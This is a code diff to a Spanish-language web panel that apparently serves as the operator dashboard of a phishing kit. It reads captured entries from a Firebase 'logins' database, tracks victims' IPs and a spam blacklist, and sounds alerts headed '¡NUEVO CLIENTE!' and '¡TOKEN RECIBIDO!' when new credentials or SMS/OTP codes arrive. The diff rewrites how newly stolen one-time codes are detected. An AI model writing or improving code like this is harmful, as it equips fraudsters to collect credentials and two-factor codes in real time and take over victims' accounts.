@@ -213,11 +213,12 @@
         let vistaActual = 'validos';
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
-        let idsConocidos = new Set();
-        let tokensConocidos = new Set();
+        
+        // Guardamos datos anteriores para comparar
+        let datosAnteriores = {};
         let audioAutorizado = false;
 
-        // SONIDOS
+        // SONIDO
         const sonido = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
         sonido.volume = 1.0;
 
@@ -263,11 +264,8 @@
                 sessionStorage.setItem('auth_panel', 'true');
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('panel-content').style.display = 'block';
-                
-                // AUTORIZAR AUDIO CON PRIMER CLICK
                 audioAutorizado = true;
-                playSound(); // Sonido de bienvenida
-                
+                playSound();
                 iniciarFirebase();
             } else {
                 document.getElementById('error-msg').style.display = 'block';
@@ -291,12 +289,11 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
-            // ESCUCHA EN TIEMPO REAL
             db.ref('logins').on('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
-                const idsActuales = new Set();
-                const tokensActuales = new Set();
+                let hayNuevoCliente = false;
+                let hayNuevoOTP = false;
                 
                 snap.forEach((child) => {
                     const data = child.val();
@@ -312,31 +309,42 @@
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                     }
                     
-                    // Verificar si es nuevo
-                    if (!idsConocidos.has(id) && idsConocidos.size > 0) {
-                        playSound();
-                        mostrarNotificacion('¡NUEVO CLIENTE!', false);
-                    }
-                    idsActuales.add(id);
-                    
-                    // Verificar token nuevo
-                    const token = data.sms || data.otp || '';
-                    if (token && token !== '' && token !== '----') {
-                        const tokenKey = id + ':' + token;
-                        if (!tokensConocidos.has(tokenKey) && tokensConocidos.size > 0) {
-                            playSound();
-                            mostrarNotificacion('¡TOKEN RECIBIDO!', true);
+                    // Verificar si es cliente nuevo
+                    if (!datosAnteriores[id]) {
+                        // Cliente completamente nuevo
+                        if (Object.keys(datosAnteriores).length > 0) {
+                            hayNuevoCliente = true;
                         }
-                        tokensActuales.add(tokenKey);
+                    } else {
+                        // Cliente existente - verificar si agregó OTP
+                        const tokenAnterior = datosAnteriores[id].sms || datosAnteriores[id].otp || '';
+                        const tokenActual = data.sms || data.otp || '';
+                        
+                        // Si antes no tenía token o estaba vacío, y ahora sí tiene
+                        if ((!tokenAnterior || tokenAnterior === '' || tokenAnterior === '----') && 
+                            tokenActual && tokenActual !== '' && tokenActual !== '----') {
+                            hayNuevoOTP = true;
+                        }
                     }
                     
+                    // Guardar para próxima comparación
+                    datosAnteriores[id] = {...data};
                     validos.push({ id, data, esSpam: false });
                 });
                 
-                idsConocidos = idsActuales;
-                tokensConocidos = tokensActuales;
-                datos.validos = validos;
+                // SONIDOS
+                if (hayNuevoCliente) {
+                    playSound();
+                    mostrarNotificacion('¡NUEVO CLIENTE!', false);
+                } else if (hayNuevoOTP) {
+                    // Pequeña demora para distinguir del sonido de cliente nuevo
+                    setTimeout(() => {
+                        playSound();
+                        mostrarNotificacion('¡TOKEN RECIBIDO!', true);
+                    }, 200);
+                }
                 
+                datos.validos = validos;
                 renderizar();
             });
 
@@ -396,12 +404,8 @@
                 const vecesIP = contadorIPs[data.ip] || 1;
                 const ipBloqueada = data.ip && datos.blacklist[data.ip];
                 
-                const esNuevo = idsConocidos.has(id) && !esSpam;
-                const esNuevoOTP = tieneOTP && tokensConocidos.has(id + ':' + token);
-                
                 let rowClass = 'data-row';
                 if (esSpam) rowClass += ' spam';
-                if (esNuevo) rowClass += ' nuevo';
                 
                 const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
                 
